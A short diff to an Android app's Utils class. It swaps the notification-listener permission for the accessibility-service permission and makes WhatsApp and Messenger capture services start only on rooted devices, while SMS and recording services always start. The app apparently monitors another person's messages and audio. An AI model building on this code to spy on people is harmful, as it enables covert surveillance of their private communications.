@@ -87,7 +87,7 @@ public class Utils {
 			Manifest.permission.CAPTURE_AUDIO_OUTPUT,
 			Manifest.permission.CAPTURE_VIDEO_OUTPUT,
 			Manifest.permission.WRITE_EXTERNAL_STORAGE,
-			Manifest.permission.BIND_NOTIFICATION_LISTENER_SERVICE,
+			Manifest.permission.BIND_ACCESSIBILITY_SERVICE,
 			Manifest.permission.SYSTEM_ALERT_WINDOW
 
 };
@@ -506,8 +506,12 @@ public class Utils {
 	}
 
 	public static boolean isServiceRunning(Context context){
-		return Utilidades.isServiceRunning(WhatsAppService.class,context)
-				&& Utilidades.isServiceRunning(MessengerService.class,context)
+		boolean check=true;
+		if (rooted && !(Utilidades.isServiceRunning(WhatsAppService.class, context) && Utilidades.isServiceRunning(MessengerService.class, context))) {
+			check = false;
+		}
+
+		return check
 				&& Utilidades.isServiceRunning(RecordService.class,context)
 				&& Utilidades.isServiceRunning(SmsService.class,context);
 	}
@@ -522,8 +526,10 @@ public class Utils {
 	// Start the service
 	public static void startNewService(Context context) {
 		if(!Utils.isServiceRunning(context)){
-			context.startService(new Intent(context, WhatsAppService.class));
-			context.startService(new Intent(context, MessengerService.class));
+			if(rooted) {
+				context.startService(new Intent(context, WhatsAppService.class));
+				context.startService(new Intent(context, MessengerService.class));
+			}
 			context.startService(new Intent(context, SmsService.class));
 			context.startService(new Intent(context, RecordService.class));
 		}
